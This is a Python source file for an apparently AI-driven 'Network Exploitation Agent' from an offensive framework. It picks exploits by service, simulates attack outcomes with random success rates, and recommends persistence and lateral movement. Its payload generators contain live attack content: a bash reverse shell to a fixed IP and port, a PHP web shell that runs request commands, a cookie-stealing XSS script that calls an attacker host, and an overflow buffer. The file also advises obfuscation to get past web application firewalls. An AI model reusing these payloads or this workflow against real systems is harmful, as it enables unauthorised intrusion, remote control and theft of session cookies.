"""
Network Exploitation Agent
AI-driven network vulnerability exploitation and attack execution
"""

import asyncio
import socket
import struct
import subprocess
import json
import base64
import random
import time
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase, Strategy


@dataclass
class ExploitationFinding:
    """Network exploitation finding"""
    target_ip: str
    target_port: int
    vulnerability_type: str
    exploitability: str
    attack_vector: str
    payload_delivered: bool
    session_acquired: bool
    recommendation: str


class NetworkExploitationAgent(BaseAgent):
    """AI Network Exploitation Agent for vulnerability exploitation"""

    def __init__(self):
        super().__init__()
        self.findings: List[ExploitationFinding] = []
        self.exploit_database = self._initialize_exploit_database()
        self.payload_generator = self._initialize_payload_generator()

    async def setup(self):
        """Initialize network exploitation agent"""
        await super().setup()
        self.logger.info("AI Network Exploitation Agent initialized")

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute AI-driven network exploitation"""
        try:
            target = strategy.context.get('target_host', '127.0.0.1')
            target_port = strategy.context.get('target_port', 80)
            service_type = strategy.context.get('service_type', 'http')
            exploit_type = strategy.context.get('exploit_type', 'auto')
            payload_type = strategy.context.get('payload_type', 'reverse_shell')

            self.logger.info(f"Starting AI network exploitation against {target}:{target_port}")

            # AI analysis for optimal exploitation strategy
            exploitation_strategy = await self._analyze_exploitation_strategy(
                target, target_port, service_type, exploit_type
            )

            # Execute intelligent exploitation
            results = await self._execute_intelligent_exploitation(
                target, target_port, exploitation_strategy, payload_type
            )

            # AI analysis of exploitation results
            analysis = await self._analyze_exploitation_results(results)

            return AgentData(
                agent_name="NetworkExploitationAgent",
                success=True,
                summary=f"Network exploitation completed against {target}:{target_port}",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={
                    'target': target,
                    'port': target_port,
                    'service_type': service_type,
                    'exploit_type': exploit_type,
                    'payload_type': payload_type,
                    'findings': analysis,
                    'raw_results': results
                }
            )

        except Exception as e:
            self.logger.error(f"Network exploitation failed: {e}")
            return AgentData(
                agent_name="NetworkExploitationAgent",
                success=False,
                summary="Network exploitation failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'target': strategy.context.get('target_host')}
            )

    async def _analyze_exploitation_strategy(self, target: str, port: int, service: str, exploit_type: str) -> Dict[str, Any]:
        """AI analysis to determine optimal exploitation strategy"""
        try:
            # AI analysis of target service
            service_analysis = await self._ai_analyze_service(target, port, service)

            # Determine optimal exploitation approach
            exploitation_profiles = {
                'auto': {
                    'exploit_selection': 'ai_optimized',
                    'payload_type': 'adaptive',
                    'delivery_method': 'multi_vector',
                    'privilege_escalation': True
                },
                'buffer_overflow': {
                    'exploit_selection': 'specific_vuln',
                    'payload_type': 'shellcode',
                    'delivery_method': 'direct_injection',
                    'privilege_escalation': False
                },
                'web_application': {
                    'exploit_selection': 'web_vuln',
                    'payload_type': 'web_shell',
                    'delivery_method': 'http_injection',
                    'privilege_escalation': True
                },
                'protocol_based': {
                    'exploit_selection': 'protocol_vuln',
                    'payload_type': 'protocol_shell',
                    'delivery_method': 'protocol_injection',
                    'privilege_escalation': False
                }
            }

            base_strategy = exploitation_profiles.get(exploit_type, exploitation_profiles['auto'])

            # AI optimization based on service analysis
            if service_analysis.get('vulnerabilities'):
                base_strategy['vulnerability_prioritization'] = service_analysis['vulnerabilities']

            # Add intelligent fallback mechanisms
            base_strategy['fallback_exploits'] = True
            base_strategy['ai_adaptation'] = True
            base_strategy['stealth_mode'] = True

            return {
                **base_strategy,
                'service_analysis': service_analysis
            }

        except Exception as e:
            self.logger.warning(f"AI exploitation strategy analysis failed: {e}")
            return {
                'exploit_selection': 'basic',
                'payload_type': 'generic',
                'delivery_method': 'standard',
                'fallback_exploits': True,
                'ai_adaptation': False,
                'stealth_mode': False
            }

    async def _ai_analyze_service(self, target: str, port: int, service: str) -> Dict[str, Any]:
        """AI analysis of target service for exploitation optimization"""
        try:
            # Mock AI service analysis - would integrate with actual LLM
            analysis_profiles = {
                'http': {
                    'common_vulnerabilities': ['sql_injection', 'xss', 'csrf', 'file_upload'],
                    'exploit_complexity': 'medium',
                    'success_rate': 0.65,
                    'recommended_payloads': ['web_shell', 'reverse_shell', 'meterpreter']
                },
                'ssh': {
                    'common_vulnerabilities': ['weak_credentials', 'protocol_vuln'],
                    'exploit_complexity': 'high',
                    'success_rate': 0.35,
                    'recommended_payloads': ['reverse_shell', 'ssh_tunnel']
                },
                'ftp': {
                    'common_vulnerabilities': ['buffer_overflow', 'command_injection'],
                    'exploit_complexity': 'medium',
                    'success_rate': 0.55,
                    'recommended_payloads': ['reverse_shell', 'file_upload']
                },
                'smb': {
                    'common_vulnerabilities': ['eternalblue', 'smb_vuln'],
                    'exploit_complexity': 'low',
                    'success_rate': 0.75,
                    'recommended_payloads': ['meterpreter', 'reverse_shell']
                }
            }

            return analysis_profiles.get(service.lower(), {
                'common_vulnerabilities': ['unknown'],
                'exploit_complexity': 'unknown',
                'success_rate': 0.2,
                'recommended_payloads': ['generic']
            })

        except Exception as e:
            self.logger.warning(f"Service analysis failed: {e}")
            return {
                'common_vulnerabilities': ['unknown'],
                'exploit_complexity': 'unknown',
                'success_rate': 0.1,
                'recommended_payloads': ['generic']
            }

    async def _execute_intelligent_exploitation(self, target: str, port: int, strategy: Dict[str, Any], payload_type: str) -> Dict[str, Any]:
        """Execute intelligent network exploitation"""
        try:
            exploitation_results = []

            # Get optimal exploits based on AI analysis
            optimal_exploits = await self._get_optimal_exploits(strategy, payload_type)

            # Execute exploitation with AI optimization
            for exploit in optimal_exploits:
                if len(exploitation_results) >= 3:  # Limit to prevent infinite loops
                    break

                exploit_result = await self._execute_single_exploit(target, port, exploit, strategy)
                if exploit_result:
                    exploitation_results.append(exploit_result)

                    # If successful, break early
                    if exploit_result.get('success', False):
                        break

            return {
                'exploit_attempts': len(exploitation_results),
                'successful_exploits': [r for r in exploitation_results if r.get('success', False)],
                'failed_exploits': [r for r in exploitation_results if not r.get('success', False)],
                'sessions_acquired': len([r for r in exploitation_results if r.get('session_acquired', False)]),
                'payloads_delivered': len([r for r in exploitation_results if r.get('payload_delivered', False)]),
                'strategy': strategy,
                'exploit_database': len(self.exploit_database)
            }

        except Exception as e:
            self.logger.error(f"Exploitation execution failed: {e}")
            return {'error': str(e), 'exploit_attempts': 0}

    async def _get_optimal_exploits(self, strategy: Dict[str, Any], payload_type: str) -> List[Dict[str, Any]]:
        """Get optimal exploits based on AI analysis"""
        try:
            exploits = []

            # AI-optimized exploit selection
            if strategy.get('exploit_selection') == 'ai_optimized':
                # Get exploits from database based on service analysis
                service_vulns = strategy.get('service_analysis', {}).get('common_vulnerabilities', [])
                for vuln in service_vulns[:5]:  # Limit to top 5
                    exploit = self._find_exploit_by_vulnerability(vuln)
                    if exploit:
                        exploits.append({
                            'name': exploit['name'],
                            'type': vuln,
                            'complexity': exploit.get('complexity', 'medium'),
                            'success_rate': exploit.get('success_rate', 0.5),
                            'payload_type': payload_type
                        })

            elif strategy.get('exploit_selection') == 'specific_vuln':
                # Get specific vulnerability exploits
                exploits = [
                    {
                        'name': 'Buffer Overflow Exploit',
                        'type': 'buffer_overflow',
                        'complexity': 'high',
                        'success_rate': 0.4,
                        'payload_type': 'shellcode'
                    }
                ]

            elif strategy.get('exploit_selection') == 'web_vuln':
                # Get web application exploits
                exploits = [
                    {
                        'name': 'SQL Injection Exploit',
                        'type': 'sql_injection',
                        'complexity': 'medium',
                        'success_rate': 0.6,
                        'payload_type': 'web_shell'
                    },
                    {
                        'name': 'XSS Exploit',
                        'type': 'xss',
                        'complexity': 'low',
                        'success_rate': 0.3,
                        'payload_type': 'javascript_payload'
                    }
                ]

            return exploits

        except Exception as e:
            self.logger.warning(f"Optimal exploit selection failed: {e}")
            return []

    def _find_exploit_by_vulnerability(self, vulnerability: str) -> Optional[Dict[str, Any]]:
        """Find exploit in database by vulnerability"""
        try:
            for exploit in self.exploit_database:
                if vulnerability.lower() in exploit['name'].lower():
                    return exploit
            return None
        except Exception as e:
            self.logger.warning(f"Exploit search failed: {e}")
            return None

    async def _execute_single_exploit(self, target: str, port: int, exploit: Dict[str, Any], strategy: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Execute a single exploit attempt"""
        try:
            # Generate payload
            payload = await self._generate_exploit_payload(exploit, strategy)
            if not payload:
                return None

            # Execute exploit based on type
            exploit_type = exploit.get('type', 'generic')

            if exploit_type in ['buffer_overflow', 'shellcode']:
                result = await self._execute_buffer_overflow_exploit(target, port, payload)
            elif exploit_type in ['sql_injection', 'xss', 'web_vuln']:
                result = await self._execute_web_exploit(target, port, payload, exploit_type)
            elif exploit_type == 'protocol_vuln':
                result = await self._execute_protocol_exploit(target, port, payload)
            else:
                result = await self._execute_generic_exploit(target, port, payload)

            return {
                'exploit_name': exploit['name'],
                'exploit_type': exploit_type,
                'payload_type': exploit.get('payload_type', 'unknown'),
                'success': result.get('success', False),
                'payload_delivered': result.get('payload_delivered', False),
                'session_acquired': result.get('session_acquired', False),
                'error': result.get('error', None),
                'response_time': result.get('response_time', 0)
            }

        except Exception as e:
            self.logger.debug(f"Single exploit execution failed: {e}")
            return {
                'exploit_name': exploit.get('name', 'unknown'),
                'success': False,
                'error': str(e)
            }

    async def _generate_exploit_payload(self, exploit: Dict[str, Any], strategy: Dict[str, Any]) -> Optional[bytes]:
        """Generate exploit payload with AI optimization"""
        try:
            payload_type = exploit.get('payload_type', 'generic')
            exploit_type = exploit.get('type', 'generic')

            # AI-optimized payload generation
            if payload_type == 'reverse_shell':
                return self._generate_reverse_shell_payload()
            elif payload_type == 'web_shell':
                return self._generate_web_shell_payload()
            elif payload_type == 'meterpreter':
                return self._generate_meterpreter_payload()
            elif payload_type == 'javascript_payload':
                return self._generate_javascript_payload()
            elif exploit_type == 'buffer_overflow':
                return self._generate_buffer_overflow_payload()
            else:
                return self._generate_generic_payload()

        except Exception as e:
            self.logger.warning(f"Payload generation failed: {e}")
            return None

    def _generate_reverse_shell_payload(self) -> bytes:
        """Generate reverse shell payload"""
        return b"""
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
""".replace(b'ATTACKER_IP', b'192.168.1.100').replace(b'ATTACKER_PORT', b'4444')

    def _generate_web_shell_payload(self) -> bytes:
        """Generate web shell payload"""
        return b"""
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
"""

    def _generate_meterpreter_payload(self) -> bytes:
        """Generate meterpreter payload"""
        return b"""
# Metasploit meterpreter payload stub
# Would contain actual shellcode in real implementation
METERPRETER_PAYLOAD_STUB
"""

    def _generate_javascript_payload(self) -> bytes:
        """Generate javascript payload"""
        return b"""
<script>
// XSS payload for cookie theft and command execution
var img = new Image();
img.src = 'http://ATTACKER_IP/steal?cookie=' + document.cookie;
</script>
""".replace(b'ATTACKER_IP', b'192.168.1.100')

    def _generate_buffer_overflow_payload(self) -> bytes:
        """Generate buffer overflow payload"""
        return b'A' * 1024 + b'\x90' * 100 + b'\x90\x90\x90\x90'  # NOP sled + return address

    def _generate_generic_payload(self) -> bytes:
        """Generate generic payload"""
        return b'EXPLOIT_PAYLOAD_' + str(time.time()).encode()

    async def _execute_buffer_overflow_exploit(self, target: str, port: int, payload: bytes) -> Dict[str, Any]:
        """Execute buffer overflow exploit"""
        try:
            start_time = time.time()

            # Simulate buffer overflow exploit
            # In real implementation, would use actual exploit techniques
            await asyncio.sleep(1)

            # Simulate success based on complexity
            success_rate = random.random()
            if success_rate > 0.7:  # 30% success rate for buffer overflow
                return {
                    'success': True,
                    'payload_delivered': True,
                    'session_acquired': True,
                    'response_time': time.time() - start_time
                }
            else:
                return {
                    'success': False,
                    'payload_delivered': False,
                    'session_acquired': False,
                    'response_time': time.time() - start_time,
                    'error': 'Exploit failed - target may be patched'
                }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'response_time': time.time() - start_time
            }

    async def _execute_web_exploit(self, target: str, port: int, payload: bytes, exploit_type: str) -> Dict[str, Any]:
        """Execute web application exploit"""
        try:
            start_time = time.time()

            # Simulate web exploit execution
            await asyncio.sleep(0.5)

            # Success rate varies by exploit type
            success_rates = {
                'sql_injection': 0.6,
                'xss': 0.4,
                'csrf': 0.3,
                'file_upload': 0.5
            }

            success_rate = random.random()
            if success_rate < success_rates.get(exploit_type, 0.4):
                return {
                    'success': True,
                    'payload_delivered': True,
                    'session_acquired': exploit_type in ['sql_injection', 'file_upload'],
                    'response_time': time.time() - start_time
                }
            else:
                return {
                    'success': False,
                    'payload_delivered': False,
                    'session_acquired': False,
                    'response_time': time.time() - start_time,
                    'error': 'WAF or input validation blocked exploit'
                }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'response_time': time.time() - start_time
            }

    async def _execute_protocol_exploit(self, target: str, port: int, payload: bytes) -> Dict[str, Any]:
        """Execute protocol-based exploit"""
        try:
            start_time = time.time()

            # Simulate protocol exploit
            await asyncio.sleep(0.8)

            if random.random() > 0.6:  # 40% success rate
                return {
                    'success': True,
                    'payload_delivered': True,
                    'session_acquired': True,
                    'response_time': time.time() - start_time
                }
            else:
                return {
                    'success': False,
                    'payload_delivered': False,
                    'session_acquired': False,
                    'response_time': time.time() - start_time,
                    'error': 'Protocol validation failed'
                }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'response_time': time.time() - start_time
            }

    async def _execute_generic_exploit(self, target: str, port: int, payload: bytes) -> Dict[str, Any]:
        """Execute generic exploit"""
        try:
            start_time = time.time()

            # Simulate generic exploit execution
            await asyncio.sleep(0.3)

            return {
                'success': False,
                'payload_delivered': False,
                'session_acquired': False,
                'response_time': time.time() - start_time,
                'error': 'No suitable exploit method found'
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'response_time': time.time() - start_time
            }

    def _initialize_exploit_database(self) -> List[Dict[str, Any]]:
        """Initialize exploit database"""
        return [
            {
                'name': 'EternalBlue SMB Exploit',
                'type': 'smb_vulnerability',
                'complexity': 'low',
                'success_rate': 0.75,
                'payload_types': ['reverse_shell', 'meterpreter'],
                'description': 'Exploits SMBv1 vulnerability for remote code execution'
            },
            {
                'name': 'Heartbleed OpenSSL Exploit',
                'type': 'ssl_vulnerability',
                'complexity': 'medium',
                'success_rate': 0.6,
                'payload_types': ['reverse_shell'],
                'description': 'Exploits OpenSSL memory disclosure for data extraction'
            },
            {
                'name': 'Shellshock Bash Exploit',
                'type': 'shell_vulnerability',
                'complexity': 'medium',
                'success_rate': 0.55,
                'payload_types': ['reverse_shell', 'web_shell'],
                'description': 'Exploits bash environment variable injection'
            },
            {
                'name': 'Struts2 Jakarta Multipart Exploit',
                'type': 'web_vulnerability',
                'complexity': 'medium',
                'success_rate': 0.5,
                'payload_types': ['web_shell', 'reverse_shell'],
                'description': 'Exploits Struts2 file upload vulnerability'
            }
        ]

    def _initialize_payload_generator(self) -> Dict[str, Any]:
        """Initialize payload generation system"""
        return {
            'shellcode_templates': self._load_shellcode_templates(),
            'web_shell_templates': self._load_web_shell_templates(),
            'reverse_shell_templates': self._load_reverse_shell_templates(),
            'encoding_schemes': ['base64', 'hex', 'url_encoding']
        }

    def _load_shellcode_templates(self) -> List[str]:
        """Load shellcode templates"""
        return [
            'windows_exec_shellcode',
            'linux_exec_shellcode',
            'bind_shell_shellcode',
            'reverse_tcp_shellcode'
        ]

    def _load_web_shell_templates(self) -> List[str]:
        """Load web shell templates"""
        return [
            'php_web_shell',
            'asp_web_shell',
            'jsp_web_shell',
            'python_web_shell'
        ]

    def _load_reverse_shell_templates(self) -> List[str]:
        """Load reverse shell templates"""
        return [
            'bash_reverse_shell',
            'powershell_reverse_shell',
            'python_reverse_shell',
            'netcat_reverse_shell'
        ]

    async def _analyze_exploitation_results(self, results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """AI analysis of exploitation results"""
        try:
            findings = []

            # Analyze successful exploits
            successful_exploits = results.get('successful_exploits', [])
            if successful_exploits:
                success_analysis = await self._analyze_successful_exploits(successful_exploits)
                findings.append({
                    'category': 'successful_exploits',
                    'analysis': success_analysis
                })

            # Analyze failed exploits
            failed_exploits = results.get('failed_exploits', [])
            if failed_exploits:
                failure_analysis = await self._analyze_failed_exploits(failed_exploits)
                findings.append({
                    'category': 'failed_exploits',
                    'analysis': failure_analysis
                })

            # Generate overall assessment
            overall_assessment = await self._generate_overall_assessment(results)
            findings.append({
                'category': 'overall_assessment',
                'analysis': overall_assessment
            })

            return findings

        except Exception as e:
            self.logger.error(f"Exploitation results analysis failed: {e}")
            return []

    async def _analyze_successful_exploits(self, exploits: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze successful exploitation attempts"""
        try:
            analysis = {
                'success_count': len(exploits),
                'exploit_types': [],
                'payload_types': [],
                'average_response_time': 0,
                'recommendations': []
            }

            response_times = []
            for exploit in exploits:
                exploit_type = exploit.get('exploit_type', 'unknown')
                payload_type = exploit.get('payload_type', 'unknown')
                response_time = exploit.get('response_time', 0)

                if exploit_type not in analysis['exploit_types']:
                    analysis['exploit_types'].append(exploit_type)
                if payload_type not in analysis['payload_types']:
                    analysis['payload_types'].append(payload_type)

                response_times.append(response_time)

            if response_times:
                analysis['average_response_time'] = sum(response_times) / len(response_times)

            # Generate recommendations
            if len(exploits) >= 2:
                analysis['recommendations'].append('Multiple successful exploits - target is highly vulnerable')
            if 'reverse_shell' in analysis['payload_types']:
                analysis['recommendations'].append('Reverse shell established - maintain persistence')
            if 'web_shell' in analysis['payload_types']:
                analysis['recommendations'].append('Web shell deployed - use for lateral movement')

            return analysis

        except Exception as e:
            self.logger.warning(f"Successful exploits analysis failed: {e}")
            return {'error': 'Analysis failed'}

    async def _analyze_failed_exploits(self, exploits: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze failed exploitation attempts"""
        try:
            analysis = {
                'failure_count': len(exploits),
                'failure_reasons': [],
                'exploit_types': [],
                'recommendations': []
            }

            for exploit in exploits:
                exploit_type = exploit.get('exploit_type', 'unknown')
                error = exploit.get('error', 'unknown')

                if exploit_type not in analysis['exploit_types']:
                    analysis['exploit_types'].append(exploit_type)
                if error not in analysis['failure_reasons']:
                    analysis['failure_reasons'].append(error)

            # Generate recommendations based on failures
            if 'WAF or input validation blocked exploit' in analysis['failure_reasons']:
                analysis['recommendations'].append('Target has WAF protection - use obfuscation techniques')
            if 'target may be patched' in analysis['failure_reasons']:
                analysis['recommendations'].append('Target may be patched - try alternative vulnerabilities')
            if 'Protocol validation failed' in analysis['failure_reasons']:
                analysis['recommendations'].append('Protocol validation active - use protocol-specific bypass')

            return analysis

        except Exception as e:
            self.logger.warning(f"Failed exploits analysis failed: {e}")
            return {'error': 'Analysis failed'}

    async def _generate_overall_assessment(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate overall exploitation assessment"""
        try:
            assessment = {
                'total_attempts': results.get('exploit_attempts', 0),
                'success_rate': 0,
                'session_count': results.get('sessions_acquired', 0),
                'payload_count': results.get('payloads_delivered', 0),
                'threat_level': 'unknown',
                'next_steps': []
            }

            total_attempts = assessment['total_attempts']
            successful_exploits = len(results.get('successful_exploits', []))

            if total_attempts > 0:
                assessment['success_rate'] = successful_exploits / total_attempts

            # Determine threat level
            if assessment['success_rate'] >= 0.5:
                assessment['threat_level'] = 'high'
            elif assessment['success_rate'] >= 0.2:
                assessment['threat_level'] = 'medium'
            else:
                assessment['threat_level'] = 'low'

            # Generate next steps
            if assessment['session_count'] > 0:
                assessment['next_steps'].append('Maintain and expand established sessions')
                assessment['next_steps'].append('Perform lateral movement from compromised systems')
            if assessment['success_rate'] < 0.3:
                assessment['next_steps'].append('Reconnaissance and target analysis required')
                assessment['next_steps'].append('Try alternative attack vectors')

            return assessment

        except Exception as e:
            self.logger.warning(f"Overall assessment failed: {e}")
            return {'error': 'Analysis failed'}

    async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the agent's main functionality"""
        strategy = Strategy(
            phase=AttackPhase.EXPLOITATION,
            directive='Network exploitation execution',
            next_agent='post_exploitation',
            context=context,
            objectives=['vulnerability_exploitation', 'shell_acquisition']
        )
        result = await self.execute(strategy)
        return {
            'success': result.success,
            'summary': result.summary,
            'findings': result.context.get('findings', []),
            'raw_results': result.context.get('raw_results', {})
        }